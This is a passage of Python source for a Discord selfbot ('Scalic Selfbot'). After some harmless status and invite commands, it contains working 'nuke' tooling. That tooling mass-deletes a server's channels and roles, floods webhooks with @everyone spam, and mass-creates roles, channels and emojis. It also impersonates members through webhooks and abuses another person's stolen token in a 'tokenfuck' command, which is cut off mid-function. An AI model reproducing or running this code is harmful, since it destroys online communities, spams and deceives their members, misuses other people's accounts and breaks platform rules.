@scalic.command(aliases=["statusdelay","watchdelay","gamedelay","twitchdelay","listendelay","adddelay","addstatusdelay"])
async def cycledelay(ctx,newdelay="5"):
    global delaybetweencycle
    delaybetweencycle = int(newdelay)
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Scalic Selfbot - Cycle Delay", description=f"Delay is now : `{delaybetweencycle} seconds", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.message.edit(content="",embed=embed)

@scalic.command(aliases=["cyclelisten","cyclelisteningstatus","listenstatuscycle","cyclelistenstatus","cyclelistening","listeningcycle"])
async def listencycle(ctx):
    global statusdata
    global delaybetweencycle
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Scalic Selfbot - Listen Cycle", description=f"Cycling these statuses:\n`{statusdata}`\nDelay:\n`{delaybetweencycle}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.message.edit(content="",embed=embed)
    while True:
        for listenstatus in statusdata:
            await scalic.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=listenstatus))
            await asyncio.sleep(int(delaybetweencycle)) 

@scalic.command(aliases=["cyclestream","streamstatuscycle","cyclestreamingstatus","cyclestreaming","streamingcycle"])
async def streamcycle(ctx):
    global statusdata
    global delaybetweencycle
    global streamurl
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Scalic Selfbot - Stream Cycle", description=f"Cycling these statuses:\n`{statusdata}`\nDelay:\n`{delaybetweencycle}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.message.edit(content="",embed=embed)
    while True:
        for streamstatus in statusdata:
            stream = discord.Streaming(
                name=streamstatus,
                url=streamurl, 
            )
            await scalic.change_presence(activity=stream) 
            await asyncio.sleep(int(delaybetweencycle)) 

@scalic.command(aliases=['listening'])
async def listen(ctx, *, listenstatus="I didn't know how to specify a listen status lol"):
    randcolor = random.randint(0x000000, 0xFFFFFF)
    await scalic.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=listenstatus))
    embed=discord.Embed(title="Scalic Selfbot - Listen Status", description=f"Status is now : `Listening to {listenstatus}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.message.edit(content="",embed=embed)

@scalic.command(aliases=['gaming'])
async def game(ctx, *, gamestatus="I didn't know how to specify a game status lol"):
    randcolor = random.randint(0x000000, 0xFFFFFF)
    await scalic.change_presence(status=discord.Status.dnd, activity=discord.Game(name=gamestatus))  #I thought using dnd spicened it up a bit - I don't think I've ever seen a selfbot use dnd as to my belief it doesn't work for some of the other stuff - this makes it unique ig 
    embed=discord.Embed(title="Scalic Selfbot - Game Status", description=f"Status is now : `Playing {gamestatus}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.message.edit(content="",embed=embed)

@scalic.command(aliases=['watching'])
async def watch(ctx, *, watchstatus ="I didn't know how to specify a watch status lol"):
    randcolor = random.randint(0x000000, 0xFFFFFF)
    await scalic.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=watchstatus))    
    embed=discord.Embed(title="Scalic Selfbot - Watch Status", description=f"Status is now : `Watching {watchstatus}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.message.edit(content="",embed=embed)

@scalic.command(aliases=['twitch'",twitchstream","streaming"])
async def stream(ctx, *, streamstatus): 
    global streamurl
    stream = discord.Streaming(
        name=streamstatus,
        url=streamurl, 
    )
    randcolor = random.randint(0x000000, 0xFFFFFF)
    await scalic.change_presence(activity=stream)  
    embed=discord.Embed(title="Scalic Selfbot - Stream Status", description=f"Status is now : `Streaming {streamstatus}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.message.edit(content="",embed=embed)

@scalic.command(aliases=['streamurl'])
async def twitchurl(ctx, streamurltouse): 
    global streamurl
    randcolor = random.randint(0x000000, 0xFFFFFF)
    streamurl = streamurltouse
    embed=discord.Embed(title="Scalic Selfbot - Stream Url Changed", description=f"Streamurl is now : `{streamurl}`\nTry {prefix.strip()}stream or {prefix.strip()}streamcycle", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.message.edit(content="",embed=embed)
       

@scalic.command(aliases=["btc","btcusd","usdbtc"])
async def bitcoin(ctx):
    data = requests.get("https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD").text
    j = json.loads(data)
    dolor = j['USD']
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Scalic Selfbot - Bitcoin command", description=f"Bitcoin value : `${dolor}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.message.edit(content="",embed=embed)


@scalic.command(aliases=["invitelink","makeinvite","createinvite"])
async def invite(ctx): 
    payload = {
    'max_age': '0',
    'max_uses': '0',
    'temporary': False
    }
    randcolor = random.randint(0x000000, 0xFFFFFF)
    headers = { 'authorization': token.strip() }
    try:
        inv = requests.post(f'https://discord.com/api/v6/channels/{ctx.channel.id}/invites', json = payload, headers = headers)
    except:
        inv = requests.post(f'https://discord.com/api/v6/channels/{ctx.channel.id}/invites', json = {"max_age":86400}, headers = headers)
    embed=discord.Embed(title="Scalic Selfbot -Invite Creation", description=f"Invite Made - https://discord.gg/{str(inv.json()['code'])}", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.message.edit(content="",embed=embed)

@scalic.command(aliases=["deleteaftertime"])
async def timetodeleteafter(ctx,deletetime):
    global deleteaftertime
    randcolor = random.randint(0x000000, 0xFFFFFF)
    deleteaftertime = deletetime
    embed=discord.Embed(title="Scalic Selfbot - Delete after time Edited", description=f"Delete after time is now : `{deletetime} seconds`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.message.edit(content="",embed=embed)

@scalic.command(aliases=['deleteafter', 'afterdelete'])
async def deletemessagesafter(ctx,delstatus=None):
    global deleteafter 
    if delstatus == None:
        if deleteafter == "off":
            deleteafter = "on"
        elif deleteafter == "on":
            deleteafter = "off"
    else:
        if delstatus.lower() == "off":
            deleteafter = "off"
        if delstatus.lower() == "on":
            deleteafter = "on"

        if delstatus.lower() == "true":
            deleteafter = "on"
        if delstatus.lower() == "false":
            deleteafter = "off"

    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Scalic Selfbot - Delete after", description=f"Deleting messages after they've been sent : `{deleteafter}`\nTime between them being sent and deletion : `{deleteaftertime}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.message.edit(content="",embed=embed)

@scalic.event
async def on_command_error(ctx,error):
    global commandsdone
    if isinstance(error, commands.CommandNotFound):
        commandsdone -= 1
    else:
        with open(f'Log/errorlog.txt', 'a') as er:
            er.write(f"[!] You said : \"{ctx.message.content}\" | Error : \"{str(error)}\"\n")


@scalic.event
async def on_connect():
    global starttime
    starttime = time.time()
    spinner.stop()
    os.system("cls")
    threading.Thread(target = screen).start()
    try:

        f = open(f"./data/{str(scalic.user.id)}.ico",'r')
        f.close()
    except:
        response = requests.get(scalic.user.avatar_url, stream=True)
        with open(f"./data/{str(scalic.user.id)}.png", 'wb') as scalic_pfp: 
            shutil.copyfileobj(response.raw, scalic_pfp)

        filename = f"./data/{str(scalic.user.id)}.png"
        img = Image.open(filename)
        img.save(f"./data/{str(scalic.user.id)}.ico",format = 'ICO', sizes=[(32,32)])






def deletionofachannel(channeldetails):
    try:
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
        requests.delete(f"https://canary.discord.com/api/v8/channels/{channeldetails}",headers=headers)
    except:
        pass

def deletionofarole(idoftheguild,roledetails):
    try:
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
        requests.delete(f"https://discord.com/api/v8/guilds/{idoftheguild}/roles/{roledetails}",headers=headers)
    except:
        pass

@scalic.command(aliases=['deletechans', 'deleteallchannels',"delchan","delchans","channeldel","channeldeletion"])
async def deletechannels(ctx):
    await ctx.message.delete()
    for chan in ctx.guild.channels:
     
        try:
            threading.Thread(target = deletionofachannel, args = (chan.id,)).start() 
        except:
            pass

@scalic.command(aliases=['deleterols', 'deleteallroles',"delroles","roledel","delrols","roldel","roledeletion"])
async def deleteroles(ctx):
    await ctx.message.delete()
    for rol in ctx.guild.roles:
        threading.Thread(target = deletionofarole, args = (ctx.guild.id,rol.id,)).start()

def ssspam(webhook):
    global spammingdawebhookeroos
    while spammingdawebhookeroos:

        randcolor = random.randint(0x000000, 0xFFFFFF)
        data = {
          "content": "@everyone **Nuked via scalic** Body-ody-ody-ody-ody-ody-ody-ody Body-yada-yada-yada-yada-yada-yada-yada-yada weeee @@@@@@@@@@@@@@@ sksksksk\n:chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains:",
          "embeds": [
            {
              "title": "This server has been nuked via scalic nuker",
              "tts": "true",
              "description": "**Body-ody-ody-ody-ody-ody-ody-ody**\n\n__Body-ody-ody-ody-ody-ody-ody-ody__\n\n_Body-ody-ody-ody-ody-ody-ody-ody_\n\n**Body-ody-ody-ody-ody-ody-ody-ody**\n\n__Body-ody-ody-ody-ody-ody-ody-ody__\n\n_Body-ody-ody-ody-ody-ody-ody-ody_\n\n**Body-ody-ody-ody-ody-ody-ody-ody**\n\n__Body-ody-ody-ody-ody-ody-ody-ody__\n\n_Body-ody-ody-ody-ody-ody-ody-ody_\n\n**Body-ody-ody-ody-ody-ody-ody-ody**\n\n__Body-ody-ody-ody-ody-ody-ody-ody__\n\n_Body-ody-ody-ody-ody-ody-ody-ody_\n\n**Body-ody-ody-ody-ody-ody-ody-ody**\n\n__Body-ody-ody-ody-ody-ody-ody-ody__\n\n_Body-ody-ody-ody-ody-ody-ody-ody_\n\n**Body-ody-ody-ody-ody-ody-ody-ody**\n\n__Body-ody-ody-ody-ody-ody-ody-ody__\n\n_Body-ody-ody-ody-ody-ody-ody-ody_\n\n**Body-ody-ody-ody-ody-ody-ody-ody**\n\n__Body-ody-ody-ody-ody-ody-ody-ody__\n\n_Body-ody-ody-ody-ody-ody-ody-ody_\n\n**Body-ody-ody-ody-ody-ody-ody-ody**\n\n__Body-ody-ody-ody-ody-ody-ody-ody__\n\n_Body-ody-ody-ody-ody-ody-ody-ody_\n\n**Body-ody-ody-ody-ody-ody-ody-ody**\n\n__Body-ody-ody-ody-ody-ody-ody-ody__\n\n_Body-ody-ody-ody-ody-ody-ody-ody_\n\n**Body-ody-ody-ody-ody-ody-ody-ody**\n\n__Body-ody-ody-ody-ody-ody-ody-ody__\n\n_Body-ody-ody-ody-ody-ody-ody-ody_\n\n**Body-ody-ody-ody-ody-ody-ody-ody**\n\n__Body-ody-ody-ody-ody-ody-ody-ody__\n\n_Body-ody-ody-ody-ody-ody-ody-ody_\n\n**Body-ody-ody-ody-ody-ody-ody-ody**\n\n__Body-ody-ody-ody-ody-ody-ody-ody__\n\n_Body-ody-ody-ody-ody-ody-ody-ody_\n\n**Body-ody-ody-ody-ody-ody-ody-ody**\n\n__Body-ody-ody-ody-ody-ody-ody-ody__\n\n_Body-ody-ody-ody-ody-ody-ody-ody_",
              "url": "https://www.youtube.com/watch?v=X_C26M6MJiY",
              "color": randcolor,
              "fields": [
                {
                  "name": "Scalic Nuker",
                  "value": "Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker"
                },
                {
                  "name": "Nuked by scalic Nuked by scalic",
                  "value": "Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker"
                },
                {
                  "name": "Scalic Nuker Scalic Nuker Scalic Nuker",
                  "value": ":chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains:  :chains: :chains: :chains:  :chains: :chains: :chains:  :chains: :chains: :chains:  :chains: :chains: :chains:  :chains: :chains: :chains:  :chains: :chains: :chains:  :chains: :chains: :chains:  :chains: :chains: :chains:"
                },
                {
                  "name": "eee",
                  "value": ":chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains:  :chains: :chains: :chains:  :chains: :chains: :chains:  :chains: :chains: :chains:  :chains: :chains: :chains:  :chains: :chains: :chains:  :chains: :chains: :chains:  :chains: :chains: :chains:  :chains: :chains: :chains:"
                }
              ],
              "author": {
                "name": "Scalic",
                "url": "https://avatars.githubusercontent.com/u/78554732?s=200&v=4",
                "icon_url": "https://avatars.githubusercontent.com/u/78554732?s=200&v=4"
              },
              "footer": {
                "text": "Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker",
                "icon_url": "https://avatars.githubusercontent.com/u/78554732?s=200&v=4"
              },
              "image": {
                "url": "https://avatars.githubusercontent.com/u/78554732?s=200&v=4"
              },
              "thumbnail": {
                "url": "https://avatars.githubusercontent.com/u/78554732?s=200&v=4"
              }
            },
            {
              "url": "https://www.youtube.com/watch?v=X_C26M6MJiY",
              "image": {
                "url": "https://avatars.githubusercontent.com/u/78554732?s=200&v=4"
              }
            },
            {
              "url": "https://www.youtube.com/watch?v=X_C26M6MJiY",
              "image": {
                "url": "https://avatars.githubusercontent.com/u/78554732?s=200&v=4"
              }
            },
            {
              "url": "https://www.youtube.com/watch?v=X_C26M6MJiY",
              "image": {
                "url": "https://avatars.githubusercontent.com/u/78554732?s=200&v=4"
              }
            }
          ],
          "username": "Scalic nuker scalic nuker - an advanced selfbot made open source on github! @@@@",
          "avatar_url": "https://avatars.githubusercontent.com/u/78554732?s=200&v=4"
        }

        spamming = requests.post(webhook, json=data)  
        spammingerror = spamming.text
        if spamming.status_code == 204:
            pass #i might have something here later so putting pass in for now

        elif "rate limited" in spammingerror.lower():
            
            try:
                j = json.loads(spammingerror)
                ratelimit = j['retry_after']
                timetowait = ratelimit / 1000
                time.sleep(timetowait)

            except:
                delay = random.randint(5, 10)
                time.sleep(delay)
        else:
            delay = random.randint(30, 60)
            time.sleep(delay)


@scalic.command(aliases=['webhookfuck', 'spamwebhooks',"webhooknuke","webhooksnuke","webhooksfuck","spamwebhook"])
async def webhookspam(ctx):
    global spammingdawebhookeroos
    try:
        await ctx.message.delete()
    except:
        pass
    spammingdawebhookeroos = True
    if len(await ctx.guild.webhooks()) != 0: #nuked with existing ones too!
        for webhook in await ctx.guild.webhooks():
            threading.Thread(target = ssspam, args = (webhook.url,)).start()
    if len(ctx.guild.text_channels) >= 50:
        webhookamount = 1

    else:
        webhookamount = 50 / len(ctx.guild.text_channels) 
        webhookamount = int(webhookamount) + 1 #+1 just in case any errors idk
    for i in range(webhookamount):  #sooo - a bit about this. 50 webhooks can usually be made at once - it'll give you the option to make more but return "internal error" - this is an efficient way to make the correct amount of channels and get the best possible spam (multiple webhooks in one channel isnt efficient)
        for channel in ctx.guild.text_channels:

            try:
            
                webhook =await channel.create_webhook(name='Nuked via scalic ig')
                threading.Thread(target = ssspam, args = (webhook.url,)).start()
                f = open(r'data/webhooks-'+str(ctx.guild.id)+".txt",'a')
                f.write(f"{webhook.url} \n")
                f.close()

            except:
                print (f"{Fore.RED} > Webhook Error")


def nooooourrolesgotnukedomg(idofguild,nameofchan):
    try:
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
        randcolor = random.randint(0x000000, 0xFFFFFF)
        make = requests.post(f"https://discord.com/api/v8/guilds/{idofguild}/roles",headers=headers,json={"name":nameofchan,"permissions":"2251804225","color":randcolor,"mentionable":"true"})
    except:
        pass

@scalic.command(aliases=['spamrole', 'rolefuck',"fuckrole","fuckroles","rolesfuck","nukeroles","rolenuke"])
async def rolespam(ctx,amountofthemtomake=None,*,nameofthem=None):
    await ctx.message.delete()
    if nameofthem == None:
        nameofthem = "Nuked via scalic ig"

    if amountofthemtomake == None:
        amountofthemtomake = 50
    for i in range(int(amountofthemtomake)):
        threading.Thread(target = nooooourrolesgotnukedomg, args = (ctx.guild.id,nameofthem,)).start()







@scalic.command(aliases=['stopwebhookfuck', 'webhookstop',"webhookspamstop","stopwebhooksspam","webhookspamoff"])
async def stopwebhookspam(ctx):
    global spammingdawebhookeroos
    try:
        await ctx.message.delete()
    except:
        pass
    spammingdawebhookeroos = False

def nooooourchannelsgotnukedomg(idofguild,nameofchan):
    try:
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
        req = requests.post(f"https://canary.discord.com/api/v8/guilds/{idofguild}/channels",headers=headers,json={"type":"0","name":nameofchan})
    except:
        pass

@scalic.command(aliases=['textchannelcreation', 'textchannelnuke',"channelspam","nuketextchannels","channelsspam"])
async def nuketextchannel(ctx,amountofthemtomake=None,*,nameofthem=None):
    await ctx.message.delete()
    if nameofthem == None:
        nameofthem = "Nuked-via-scalic-ig"
    else:
        nameofthem = nameofthem.replace(" ","-")

    if amountofthemtomake == None:
        amountofthemtomake = 50
    for i in range(int(amountofthemtomake)):
        threading.Thread(target = nooooourchannelsgotnukedomg, args = (ctx.guild.id,nameofthem,)).start()

@scalic.command(aliases=['emojicreation', 'emojinuke',"emojisspam","nukeemojis","emojispam","emojisnuke","emotespam"])
async def emotenuke(ctx):
    await ctx.message.delete()
    with open("data/scalic-bomb-emoji-for-server-nukes.jpeg", "rb") as f:
        img1 = f.read()
    with open("data/scalic-clown-emoji-for-server-nukes.jpeg", "rb") as f:
        img2 = f.read()
    with open("data/scalic-nuke-emoji-for-server-nukes.jpeg", "rb") as f:
        img3 = f.read()

    with open("data/scalic-orange-justice-gif-for-server-nukes.jpeg", "rb") as f:
        gif1 = f.read()

    with open("data/scalic-nuke-gif-for-server-nukes.jpeg", "rb") as f:
        gif2 = f.read()
        

    sijome = [img1,img2,img3]
    sfig = [gif1,gif2]
    for i in range(50):  #after 50 youll get ratelimited, so no point , even if the server has a million boosts :)
        try:
            randemoj = random.choice(sijome)
            randomemojiname =  "".join(random.choice(characters) for scale in range(32))
            await ctx.guild.create_custom_emoji(name = (randomemojiname), image = randemoj)
        except:
            pass
        try:
            randgif = random.choice(sfig)
            randomgifname =  "".join(random.choice(characters) for scale in range(32))
            await ctx.guild.create_custom_emoji(name = (randomgifname), image = randgif)
        except Exception as po:
            with open(f'Log/errorlog.txt', 'a') as er:
                er.write(f"[!] You said : \"{ctx.message.content}\" | Error : \"{po}\"\n")



@scalic.command(aliases=['hypehousechange', 'hypehouse',"hypesquadchange","changehypesquad","changehypehouse","househype"])
async def hypesquad(ctx,squad=None):
    randcolor = random.randint(0x000000, 0xFFFFFF)
    if squad == None:
        embed=discord.Embed(title="Scalic Selfbot - Hypesquad Changer", description=f"Options : \n`{prefix.strip()}hypesquad bravery`\n`{prefix.strip()}hypesquad brilliance`\n`{prefix.strip()}hypesquad balance`", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
        await ctx.message.edit(content="",embed=embed)
    else:


        if squad.lower() == "bravery" or squad == "1":
            typeofhouse = 1
        elif squad.lower() == "brilliance" or squad == "2":
            typeofhouse = 2
        elif squad.lower() == "balance" or squad == "3":
            typeofhouse = 3

        else:
            allhouses = [1,2,3]
            typeofhouse = random.choice(allhouses)
    
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
        data = requests.post("https://discord.com/api/v6/hypesquad/online", json = {'house_id': typeofhouse}, headers=headers)
        if data.status_code == 204:
            embed=discord.Embed(title="Scalic Selfbot - Hypesquad Changer", description=f"Hypesquad changed successfully", color=randcolor)
            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
            embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
            await ctx.message.edit(content="",embed=embed)
        else:
            embed=discord.Embed(title="Scalic Selfbot - Hypesquad Changer", description=f"Error - Site responded with status code : `{data.status_code}`\nMessage : `{data.text}`", color=randcolor)
            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
            embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
            await ctx.message.edit(content="",embed=embed)



@scalic.command(aliases=['botconvert', 'botsay', 'convertbot'])
async def impersonate(ctx, member: discord.Member=None,*,message="I forgot to supply a message"):
    randcolor = random.randint(0x000000, 0xFFFFFF)
    if ctx.guild == None:
        embed=discord.Embed(title="Use this command in a server", description="\nYou did it in dms", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
        await ctx.send(embed=embed)
    else:
        if not member:  
            member = ctx.message.author 
        embed=discord.Embed(title=f"Impersonating {member.name}", description=f"\nWith message: \"{message}\"", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
        await ctx.message.delete()
        #looks smoother, remove the # if you want info on the embeds
       # msg = await ctx.message.edit(content="",embed=embed)
        if len(await ctx.channel.webhooks()) != 0:
            webhook = random.choice(await ctx.channel.webhooks())
        else:

            webhook =await ctx.channel.create_webhook(name='scalic-selfbot')
        data={
          "content": f"{message}",
          "username": f"{member.name}",
          "avatar_url": f"{member.avatar_url}"
        }
            
        req = requests.post(f"{webhook.url}",json=data)
        randcolor = random.randint(0x000000, 0xFFFFFF)
        if req.status_code == 204:
            
            embed=discord.Embed(title=f"Impersonated {member.name}", description=f"\nWith message: \"{message}\"\n\nTask Completed Successfully", color=randcolor)
            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
            embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
            #await ctx.message.edit(content="",embed=embed,delete_after=2)            
        else:
            embed=discord.Embed(title=f"Impersonating {member.name}", description=f"\nWith message: \"{message}\"\n\nError Completing Task", color=randcolor)
            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
            embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
            #await ctx.message.edit(content="",embed=embed)            

def makeguildxd(tokentouse,nukemsg):
    global serversmade

    # with open("data/scalic-clown-emoji-for-server-nukes.png", "rb") as img:
    #     imagestuff = base64.b64encode(img.read())


    data = {
    #"icon": f"data:image/png;base64,{imagestuff}",  #LEMME KNOW IF YOU CAN HELP WITH THIS!
    "name": nukemsg
    }
    headers={"authorization": tokentouse}


    servercreation = requests.post("https://discord.com/api/v8/guilds/templates/GC9sXUCX85P8",headers=headers,json=data).status_code
    if servercreation == 201:
        serversmade += 1
  


@scalic.command(aliases=['tokenfuck',"tockenfuck","fucktocken","accountfuck","fuckaccount"])
async def fucktoken(ctx,tokentofrick=None,*,nukemsg=f"This account was nuked with the help of scalic! - GG"):
    global serversmade
    serversmade = 0
    randcolor = random.randint(0x000000, 0xFFFFFF)
    await ctx.message.delete()
    if tokentofrick == None:
        embed=discord.Embed(title="Scalic Selfbot - Token Fuck", description=f"Supply a token - {prefix.strip()}tokenfuck [token-here] [message-to-nuke-with]", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
        await ctx.message.edit(content="",embed=embed)


    elif ctx.guild == None:
        embed=discord.Embed(title="Scalic Selfbot - Token Fuck", description=f"Try do this command in a private server - it has problems in dms!", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
        await ctx.message.edit(content="",embed=embed)

    else:
